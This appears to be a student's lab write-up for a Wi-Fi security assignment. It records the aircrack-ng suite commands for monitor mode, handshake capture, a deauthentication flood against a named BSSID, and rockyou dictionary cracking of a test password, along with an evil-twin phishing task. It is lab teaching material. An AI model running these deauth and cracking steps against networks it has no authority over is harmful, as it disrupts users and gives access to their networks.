1. Learn the basic working of Wi-Fi and its types with various types of attacks on it.


2. Perform Wi-Fi fingerprinting using Wigile, Inssider, and Kismet.

#### Kismet -

- Put Your Wireless Card in Monitor Mode by using the command `sudo airmon-ng start wlan0`

![image](https://user-images.githubusercontent.com/67383098/230551170-37f0d414-dd18-4c86-b728-5cfbacc2f2d3.png)

- Launch Kismet by using the command `kismet -c wlanomon`

![image](https://user-images.githubusercontent.com/67383098/230552556-1d7bd6a6-bc11-4152-9989-001327bbfb93.png)


![image](https://user-images.githubusercontent.com/67383098/230552480-bdc61d8a-b846-4b13-a472-d352e2c0d806.png)


![image](https://user-images.githubusercontent.com/67383098/230552332-32a6be07-3554-4bff-9661-17fe92d3b727.png)


3. Create an Access point with any Wi-Fi encryption standard and start testing the security of
that connection using any Wi-Fi security testing tools, which should include (Aircrack-Ng,
Wifite, not limited). Try to capture the 4-way handshake using these methods.

![image](https://user-images.githubusercontent.com/67383098/230554024-50eefd46-08d0-4e50-a525-dd92dec5881a.png)

airodump-ng wlan0

![image](https://user-images.githubusercontent.com/67383098/230555155-dc581e48-5db2-4a9d-b319-0dd5f2197e66.png)

Focus Airodump-Ng on One AP on One Channel

airodump-ng --bssid EA:B0:24:9F:4A:50  -c 5 --write WPAcrack wlan0

![image](https://user-images.githubusercontent.com/67383098/230556046-cc586b48-b820-4505-9169-646d9a28cff4.png)

Aireplay-Ng Deauth

aireplay-ng --deauth 100 -a EA:B0:24:9F:4A:50 wlan0

![image](https://user-images.githubusercontent.com/67383098/230556612-09f1a09a-3aa7-49f5-ad7f-7ad0435c226a.png)

![image](https://user-images.githubusercontent.com/67383098/230556884-b437c7ae-6f60-4174-be73-a34409ed85ec.png)




4. After capturing the required files for testing, use dictionary generation and password
cracking tools to crack the Wi-Fi password.
a. You must use an existing word file to crack the password.
b. Also you have to create your dictionary file for cracking the passwords.
c. Keep 3 different types of passwords for your Wi-Fi to test it. Simple, medium, and
complex passwords can be used for testing. Simple can be a dictionary word,
medium can be of dictionary word with some numbers, and complex can be
generated from any password generator online.

Password is `c6dp6m2k`

![image](https://user-images.githubusercontent.com/67383098/230557921-fe84d8c4-95d1-48c9-b34d-eb4152d05847.png)

aircrack-ng WPAcrack-03.cap  -w /usr/share/wordlists/rockyou.txt


When we use a weak password, we can crack it using aircrack-ng

aircrack-ng testt.cap -w /usr/share/wordlists/rockyou.txt

![image](https://user-images.githubusercontent.com/67383098/230582697-1c10599d-ef77-4013-b14d-f184c284929d.png)



5. Use Rouge AP (WifiPhisher) to create an Evil twin, perform a basic phishing attack using this
rouge AP, and document the difference between the two attacks you have performed.


6. Learn the protocol level working of WPA3 and how it differs from WPA2.





Reference Links: [Not Limited]
1. https://github.com/wifiphisher/wifiphisher
2. https://web.stanford.edu/class/ee26n/Assignments/Assignment7.html
3. https://www.wifi-professionals.com/2019/01/4-way-handshake
4. https://nooblinux.com/crack-wpa-wpa2-wifi-passwords-using-aircrack-ng-kali-linux/
5. https://en.wikipedia.org/wiki/IEEE_802.11

